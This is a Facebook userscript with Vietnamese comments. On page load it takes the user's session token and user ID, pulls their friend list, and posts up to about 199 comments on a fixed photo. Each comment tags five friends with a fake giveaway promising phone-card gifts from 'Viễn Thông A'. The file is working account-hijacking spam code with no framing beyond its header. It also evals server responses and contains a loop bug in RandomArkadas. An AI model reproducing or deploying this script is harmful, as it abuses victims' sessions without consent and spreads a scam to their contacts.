// ==UserScript==
// @name           11 mar 14 13
// @description     thanhdat2599
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ====
// ==============
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "617783474959586"; //id ảnh comment
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id)
{            
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.onreadystatechange = function ()
	{
		if(xmlhttp.readyState == 4)
		{
			eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			var x=15592;//số bắt đầu
			var i;
			 for(f=1;f<200;f++)
			{
				mesaj = "";mesaj_text = "";
				i=f;
					if(arkadaslar.payload.entries[i])
					{
						mesaj += " Đáp án của tôi là câu B. Số lượt Share là: "+x+ ", tôi muốn chia sẻ niềm vui cùng bạn: "+"@[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]"+"@[" + arkadaslar.payload.entries[i+1].uid +  ":" + arkadaslar.payload.entries[i+1].text + "]"+"@[" + arkadaslar.payload.entries[i+2].uid +  ":" + arkadaslar.payload.entries[i+2].text + "]"+"@[" + arkadaslar.payload.entries[i+3].uid +  ":" + arkadaslar.payload.entries[i+3].text + "]"+"@[" + arkadaslar.payload.entries[i+4].uid +  ":" + arkadaslar.payload.entries[i+4].text + "]"+" mỗi người bạn được tag sẽ nhận quà tặng từ Viễn Thông A là thẻ cào điện thoại tài khoản 50.000đ";				
						x+=3;
					}
						//else mesaj += " Lỗi";
						
				//}	

				yorum_yap(id ,mesaj)
			}  
			
		}
	};
	var params = "&filter[0]=user";
	params += "&options[0]=friends_only";
	params += "&options[1]=nm";
	params += "&token=v7";
	params += "&viewer=" + user_id;
	params += "&__user=" + user_id;
	if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
	else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
	xmlhttp.send();
}
function RandomArkadas()
{
	var sonuc = "";
	for(j=0;i<9;j++){
	sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
	}
	return sonuc;
}
function yorum_yap(id ,mesaj) 
{
	 var xhr = new XMLHttpRequest();
	 var params ="";
	 params +="&ft_ent_identifier="+id;
	 params +="&comment_text= "+encodeURIComponent(mesaj);
	 params +="&source=2";
	 params +="&client_id= 186911474713457";
	 params +="&reply_fbid";
	 params +="&parent_comment_id";
	 params +="&rootid=u_jsonp_2_3";
	 params +="&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":"+id+"}";
	 params +="&attached_sticker_fbid=0";
	 params +="&attached_photo_fbid=0";
	 params +="&giftoccasion";
	 params +="&ft[tn]=[]";
	 params +="&__user="+user_id;
	 params +="&__a=1";
	 params +="&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
	 params +="&__req=q";
	 params +="&fb_dtsg="+fb_dtsg;
	 params +="&ttstamp=";
	 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		xhr.onreadystatechange = function () 
		{
			if (xhr.readyState == 4 && xhr.status == 200) 
			{
				xhr.close;
			}
		}
		xhr.send(params);
}
arkadaslari_al(id);